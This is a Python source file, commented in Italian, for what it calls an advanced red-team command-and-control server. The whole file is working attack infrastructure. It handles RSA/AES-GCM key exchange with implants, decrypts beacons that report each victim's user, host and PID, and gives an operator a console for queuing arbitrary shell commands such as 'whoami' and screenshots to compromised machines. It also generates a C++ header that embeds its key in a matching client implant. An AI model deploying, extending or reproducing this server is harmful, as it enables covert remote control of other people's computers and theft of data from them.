#!/usr/bin/env python3
# c2_server_advanced.py - Advanced Red Team C2 Server
# © 2024 Sebastian Martin. All rights reserved.
# This software is proprietary and confidential. Unauthorized use is prohibited.
# Allineato perfettamente con lab_client_redt_advanced.cpp

import ssl
import socket
import threading
import json
import base64
import hashlib
import time
import logging
import subprocess
import os
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography import x509

# --- CONFIGURAZIONE AVANZATA ---
C2_PORT = 8443
C2_HOST = "0.0.0.0"
C2_PATH = "/api/report"
SSL_CERT_FILE = "server.crt"
SSL_KEY_FILE = "server.key"

# RSA Configuration (allineato con client C++)
RSA_KEY_SIZE = 2048
RSA_ALGORITHM = "RSA"
RSA_OAEP_PADDING = "OAEP"
SHA256_ALGORITHM = "SHA256"

# AES-GCM Configuration (allineato con client C++)
AES_KEY_SIZE = 32  # 256-bit
AES_IV_SIZE = 12   # 96-bit per GCM
AES_TAG_SIZE = 16   # 128-bit authentication tag

# Sessione client attivi
active_clients = {}
client_keys = {}
client_state_lock = threading.Lock()

# RSA Keypair globale
rsa_private_key = None
rsa_public_key = None

# --- SETUP LOGGING AVANZATO ---
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# --- UTILITY FUNCTIONS ---
def generate_rsa_keypair():
    """Genera una coppia di chiavi RSA 2048-bit"""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=RSA_KEY_SIZE,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key

def rsa_encrypt(data, public_key):
    """Cifra dati con RSA-OAEP"""
    try:
        encrypted = public_key.encrypt(
            data,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return encrypted
    except Exception as e:
        logger.error(f"RSA encryption failed: {e}")
        return None

def rsa_decrypt(encrypted_data, private_key):
    """Decifra dati con RSA-OAEP"""
    try:
        decrypted = private_key.decrypt(
            encrypted_data,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return decrypted
    except Exception as e:
        logger.error(f"RSA decryption failed: {e}")
        return None

def aes_gcm_encrypt(plaintext, key, iv):
    """Cifra dati con AES-GCM"""
    try:
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        return ciphertext, encryptor.tag
    except Exception as e:
        logger.error(f"AES-GCM encryption failed: {e}")
        return None, None

def aes_gcm_decrypt(ciphertext, key, iv, tag):
    """Decifra dati con AES-GCM"""
    try:
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        return plaintext
    except Exception as e:
        logger.error(f"AES-GCM decryption failed: {e}")
        return None

def parse_beacon_data(beacon_str):
    """Parser per i dati beacon dal client"""
    try:
        parts = beacon_str.split('|')
        if len(parts) >= 4 and parts[0] == 'BEACON':
            return {
                'type': 'beacon',
                'username': parts[1],
                'hostname': parts[2],
                'pid': parts[3],
                'timestamp': datetime.now().isoformat()
            }
        elif len(parts) >= 2 and parts[0] == 'KEY_EXCHANGE':
            return {
                'type': 'key_exchange',
                'client_id': parts[1] if len(parts) > 1 else 'unknown'
            }
    except Exception as e:
        logger.error(f"Beacon parsing failed: {e}")
    return None

def execute_command(cmd):
    """Esegue comandi shell (simile a client C++)"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout if result.returncode == 0 else result.stderr
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Command execution failed: {e}"

# --- C2 HTTP REQUEST HANDLER ---
class C2RequestHandler(BaseHTTPRequestHandler):
    
    def _set_headers(self, content_type='application/octet-stream'):
        self.send_response(200)
        self.send_header('Content-Type', content_type)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_OPTIONS(self):
        """Gestisce richieste OPTIONS per CORS"""
        self._set_headers()
    
    def _handle_key_exchange(self, encrypted_data):
        """Gestisce richieste di key exchange RSA-OAEP"""
        headers_sent = False
        
        try:
            client_ip = self.client_address[0]
            
            logger.info(f"Key exchange request from {client_ip}, data size: {len(encrypted_data)} bytes")
            
            # Verifica che la chiave privata RSA sia disponibile
            if not rsa_private_key:
                logger.error("RSA private key not available for key exchange")
                self.send_error(500, "Server configuration error")
                headers_sent = True
                return
            
            # Decifra i dati con la chiave privata RSA
            decrypted_key = rsa_decrypt(encrypted_data, rsa_private_key)
            if not decrypted_key or len(decrypted_key) != AES_KEY_SIZE:
                logger.error(f"RSA decryption failed or invalid key size from {client_ip}")
                self.send_error(400, "Invalid RSA encrypted data")
                headers_sent = True
                return
            
            # Salva la chiave di sessione per questo client (thread-safe)
            with client_state_lock:
                client_keys[client_ip] = decrypted_key
            logger.info(f"Session key established for {client_ip}")
            
            # Prepara risposta di conferma cifrata con AES-GCM
            response_iv = os.urandom(AES_IV_SIZE)
            response_ciphertext, response_tag = aes_gcm_encrypt(
                b"KEY_EXCHANGE_OK", decrypted_key, response_iv
            )
            
            if response_ciphertext and response_tag:
                response_payload = response_iv + response_tag + response_ciphertext
                self._set_headers()
                headers_sent = True
                self.wfile.write(response_payload)
                logger.info(f"Key exchange completed successfully for {client_ip}")
            else:
                logger.error("Failed to encrypt key exchange response")
                if not headers_sent:
                    self.send_error(500, "Failed to encrypt response")
                    headers_sent = True
                
        except Exception as e:
            logger.error(f"Key exchange error: {e}")
            # Se non abbiamo ancora inviato headers, invia errore
            if not headers_sent:
                try:
                    self.send_error(500, "Key exchange failed")
                except:
                    # Se anche l'invio dell'errore fallisce, chiudi silenziosamente
                    pass
    
    def _handle_c2_request(self, post_data):
        """Gestisce richieste C2 normali"""
        try:
            # Elabora i dati ricevuti
            response = self._process_c2_request(post_data)
            
            self._set_headers()
            self.wfile.write(response)
            
        except Exception as e:
            logger.error(f"Error processing C2 request: {e}")
            self.send_error(500, str(e))
    
    def do_POST(self):
        """Gestisce richieste POST dal client C2"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            
            # Valida Content-Length prima di leggere il body
            if content_length <= 0:
                logger.warning(f"Invalid Content-Length: {content_length} from {self.client_address[0]}")
                self.send_error(400, "Invalid Content-Length")
                return
                
            post_data = self.rfile.read(content_length)
            
            if self.path == "/key_exchange":
                self._handle_key_exchange(post_data)
            elif self.path == C2_PATH:
                self._handle_c2_request(post_data)
            else:
                self.send_error(404)
                
        except Exception as e:
            logger.error(f"Error processing POST request: {e}")
            # Se non abbiamo ancora inviato headers, possiamo inviare errore
            if not self.wfile._closed:
                self.send_error(500, str(e))
    
    def _process_c2_request(self, data):
        """Elabora la richiesta C2 e restituisce risposta"""
        try:
            logger.debug(f"Received {len(data)} bytes from {self.client_address[0]}")
            
            # Estrai IV, tag e dati cifrati (formato: IV[12] + tag[16] + ciphertext)
            if len(data) < (AES_IV_SIZE + AES_TAG_SIZE):
                logger.warning(f"Data too small: {len(data)} bytes")
                return b"INVALID_DATA"
            
            iv = data[:AES_IV_SIZE]
            tag = data[AES_IV_SIZE:AES_IV_SIZE + AES_TAG_SIZE]
            ciphertext = data[AES_IV_SIZE + AES_TAG_SIZE:]
            
            logger.debug(f"IV: {iv.hex()}")
            logger.debug(f"Tag: {tag.hex()}")
            logger.debug(f"Ciphertext: {len(ciphertext)} bytes")
            
            # Recupera la chiave di sessione per questo client (thread-safe)
            client_ip = self.client_address[0]
            with client_state_lock:
                session_key = client_keys.get(client_ip)
            
            if not session_key:
                logger.warning(f"No session key found for client {client_ip}")
                return b"NO_SESSION_KEY"
            
            # Decifra i dati con la chiave di sessione del client
            plaintext = aes_gcm_decrypt(ciphertext, session_key, iv, tag)
            if not plaintext:
                logger.warning(f"Decryption failed for client {client_ip}")
                return b"DECRYPTION_FAILED"
            
            logger.debug(f"Decrypted plaintext: {plaintext.hex()}")
            logger.debug(f"Decrypted text: {plaintext.decode('utf-8', errors='ignore')}")
            
            # Parsa il beacon
            beacon_str = plaintext.decode('utf-8', errors='ignore')
            beacon_data = parse_beacon_data(beacon_str)
            
            if beacon_data and beacon_data['type'] == 'beacon':
                logger.info(f"Beacon from {beacon_data['username']}@{beacon_data['hostname']} (PID: {beacon_data['pid']})")
                
                # Gestisci comandi per il client
                command = self._update_client_state_and_get_command(beacon_data)
                if command:
                    # Cifra il comando per il client usando la sua chiave di sessione
                    response_iv = os.urandom(AES_IV_SIZE)
                    response_ciphertext, response_tag = aes_gcm_encrypt(
                        command.encode('utf-8'), session_key, response_iv
                    )
                    
                    if response_ciphertext and response_tag:
                        response_payload = response_iv + response_tag + response_ciphertext
                        return response_payload
                
                # Nessun comando, ritorna beacon di conferma
                return b"BEACON_ACK"
            
            return b"UNKNOWN_BEACON"
            
        except Exception as e:
            logger.error(f"Error processing C2 request: {e}")
            return b"PROCESSING_ERROR"
    
    def _update_client_state_and_get_command(self, beacon_data):
        """Aggiorna lo stato del client e restituisce comandi (thread-safe)"""
        client_id = f"{beacon_data['username']}@{beacon_data['hostname']}"
        
        # Gestione thread-safe degli active_clients
        with client_state_lock:
            # Esempio: comandi predefiniti per testing
            if client_id not in active_clients:
                active_clients[client_id] = {
                    'first_seen': datetime.now(),
                    'last_seen': datetime.now(),
                    'beacon_count': 1,
                    'pending_commands': ['exec whoami', 'screenshot']
                }
            else:
                active_clients[client_id]['last_seen'] = datetime.now()
                active_clients[client_id]['beacon_count'] += 1
            
            # Restituisci il prossimo comando in coda
            if active_clients[client_id]['pending_commands']:
                return active_clients[client_id]['pending_commands'].pop(0)
        
        return None
    
    def log_message(self, format, *args):
        """Override per logging personalizzato"""
        logger.info(f"HTTP {self.client_address[0]} - {format % args}")

# --- SERVER SETUP E AVVIO ---
def setup_ssl_context():
    """Configura il contesto SSL per HTTPS"""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    
    try:
        # Carica certificato e chiave
        context.load_cert_chain(SSL_CERT_FILE, SSL_KEY_FILE)
        
        # Configurazioni di sicurezza
        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM:DH+CHACHA20:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA')
        context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE  # Per testing, in produzione usa verifica
        
        return context
    except Exception as e:
        logger.error(f"SSL setup failed: {e}")
        return None

def start_c2_server():
    """Avvia il server C2 HTTPS"""
    try:
        # Setup SSL
        ssl_context = setup_ssl_context()
        if not ssl_context:
            logger.error("Failed to setup SSL context")
            return False
        
        # Crea server HTTPS
        server = HTTPServer((C2_HOST, C2_PORT), C2RequestHandler)
        server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
        
        logger.info(f"=== C2 SERVER STARTED ===")
        logger.info(f"Listening on: https://{C2_HOST}:{C2_PORT}{C2_PATH}")
        logger.info(f"SSL Certificate: {SSL_CERT_FILE}")
        logger.info(f"SSL Key: {SSL_KEY_FILE}")
        logger.info("Waiting for client connections...")
        
        # Avvia il server
        server.serve_forever()
        
    except Exception as e:
        logger.error(f"Failed to start C2 server: {e}")
        return False
    
    return True

# --- MANAGEMENT INTERFACE ---
def management_interface():
    """Interfaccia di gestione per l'operatore"""
    while True:
        print("\n=== C2 SERVER MANAGEMENT ===")
        print("1. List active clients")
        print("2. Send command to client")
        print("3. View server logs")
        print("4. Exit")
        
        choice = input("Select option: ").strip()
        
        if choice == '1':
            print("\nActive Clients:")
            # Access active_clients thread-safely
            with client_state_lock:
                clients_copy = active_clients.copy()
            
            for client_id, client_data in clients_copy.items():
                print(f"  {client_id} - Beacons: {client_data['beacon_count']} - Last: {client_data['last_seen']}")
        
        elif choice == '2':
            client_id = input("Client ID (user@host): ").strip()
            command = input("Command to execute: ").strip()
            
            # Access and modify active_clients thread-safely
            with client_state_lock:
                if client_id in active_clients:
                    active_clients[client_id]['pending_commands'].append(command)
                    print(f"Command queued for {client_id}")
                else:
                    print("Client not found")
        
        elif choice == '3':
            try:
                with open('c2_server.log', 'r') as f:
                    print(f.read())
            except FileNotFoundError:
                print("No log file found")
        
        elif choice == '4':
            print("Exiting management interface...")
            break
        
        else:
            print("Invalid option")

def load_rsa_private_key():
    """Carica la chiave privata RSA da file se esiste"""
    global rsa_private_key
    
    private_key_file = 'server_private_key.pem'
    if os.path.exists(private_key_file):
        try:
            with open(private_key_file, 'rb') as f:
                rsa_private_key = serialization.load_pem_private_key(
                    f.read(),
                    password=None,
                    backend=default_backend()
                )
            print(f"✓ Chiave privata RSA caricata da: {private_key_file}")
            return True
        except Exception as e:
            print(f"✗ Errore nel caricamento chiave privata: {e}")
            return False
    return False

def save_rsa_private_key():
    """Salva la chiave privata RSA su file"""
    global rsa_private_key
    
    try:
        private_key_pem = rsa_private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        with open('server_private_key.pem', 'wb') as f:
            f.write(private_key_pem)
        
        print(f"✓ Chiave privata RSA salvata in: server_private_key.pem")
        print("⚠️  AVVISO: In produzione, proteggi questo file con una password!")
        return True
        
    except Exception as e:
        print(f"✗ Errore nel salvataggio chiave privata: {e}")
        return False

def generate_and_export_rsa_keys():
    """Genera e esporta le chiavi RSA"""
    global rsa_private_key, rsa_public_key
    
    # Prima prova a caricare chiave privata esistente
    if load_rsa_private_key():
        # Se la chiave privata è stata caricata, ricava la pubblica
        rsa_public_key = rsa_private_key.public_key()
    else:
        # Altrimenti genera nuova coppia di chiavi
        try:
            rsa_private_key, rsa_public_key = generate_rsa_keypair()
            print(f"✓ Nuovo RSA Keypair generato (2048-bit)")
            
            # Salva la nuova chiave privata
            if not save_rsa_private_key():
                return False
                
        except Exception as e:
            print(f"✗ Errore nella generazione delle chiavi RSA: {e}")
            return False
    
    try:
        # Esporta chiave pubblica in formato DER/PKCS1
        public_key_der = rsa_public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.PKCS1
        )
        
        # Salva chiave pubblica su file
        with open('server_public_key.der', 'wb') as f:
            f.write(public_key_der)
        
        # Calcola fingerprint SHA256
        key_hash = hashlib.sha256(public_key_der).hexdigest()
        
        print(f"✓ Chiave pubblica salvata in: server_public_key.der")
        print(f"✓ Fingerprint SHA256: {key_hash}")
        
        # Genera header C++ con array di byte
        generate_cpp_header(public_key_der, key_hash)
        
        return True
        
    except Exception as e:
        print(f"✗ Errore nell'esportazione delle chiavi: {e}")
        return False

def generate_cpp_header(public_key_der, key_hash):
    """Genera header C++ con array di byte della chiave pubblica"""
    try:
        header_content = f"// Server Public Key Header - Auto-generated\n"
        header_content += f"// SHA256 Fingerprint: {key_hash}\n"
        header_content += f"// Timestamp: {datetime.now().isoformat()}\n\n"
        header_content += f"#pragma once\n\n"
        header_content += f"#include <cstdint>\n\n"
        header_content += f"// RSA Public Key in DER/PKCS1 format\n"
        header_content += f"constexpr uint8_t SERVER_PUBLIC_KEY[] = {{\n"
        
        # Formatta i byte in formato C++ array
        for i, byte in enumerate(public_key_der):
            if i % 16 == 0:
                header_content += "    "
            header_content += f"0x{byte:02x},"
            if i % 16 == 15 or i == len(public_key_der) - 1:
                header_content += "\n"
        
        header_content += "};\n\n"
        header_content += f"constexpr size_t SERVER_PUBLIC_KEY_SIZE = sizeof(SERVER_PUBLIC_KEY);\n"
        
        with open('server_public_key.h', 'w') as f:
            f.write(header_content)
        
        print(f"✓ Header C++ generato: server_public_key.h")
        
    except Exception as e:
        print(f"✗ Errore nella generazione dell'header C++: {e}")

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    print("=== Advanced Red Team C2 Server ===")
    print("Starting server...")
    
    # Genera ed esporta chiavi RSA
    if not generate_and_export_rsa_keys():
        print("Failed to generate RSA keys - exiting")
        sys.exit(1)
    
    # Verifica file SSL
    if not os.path.exists(SSL_CERT_FILE) or not os.path.exists(SSL_KEY_FILE):
        print("SSL certificate or key file not found!")
        print("Please ensure 'server.crt' and 'server.key' are in the current directory")
        sys.exit(1)
    
    # Avvia server in thread separato
    server_thread = threading.Thread(target=start_c2_server, daemon=True)
    server_thread.start()
    
    # Avvia interfaccia di gestione
    try:
        management_interface()
    except KeyboardInterrupt:
        print("\nServer shutdown requested...")
    
    print("C2 Server stopped")